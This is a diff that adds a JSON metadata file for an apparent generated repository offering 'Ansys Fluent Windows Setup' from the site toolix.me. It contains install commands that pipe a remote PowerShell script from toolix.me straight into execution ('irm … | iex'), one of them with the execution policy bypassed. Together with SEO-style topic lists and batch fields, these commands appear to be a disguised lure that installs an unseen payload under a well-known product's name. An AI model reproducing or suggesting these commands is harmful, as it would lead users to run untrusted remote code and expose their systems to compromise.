@@ -1,0 +1,28 @@
+{
+  "repo": "Ansys-Fluent-Windows-Setup",
+  "product": "Ansys Fluent Windows Setup",
+  "product_title": "Ansys Fluent Windows",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "dev",
+  "topics": [
+    "how-to-install-ansys-fluent-windows",
+    "ansys-fluent-windows-app",
+    "simulation-software",
+    "finite-element",
+    "engineering-analysis",
+    "developer-tools",
+    "database-tools",
+    "scientific-computing",
+    "ansys-fluent-windows-windows-tool",
+    "ansys-fluent-windows-modeling-tool",
+    "windows-11",
+    "install-guide"
+  ],
+  "site": "toolix.me"
+}
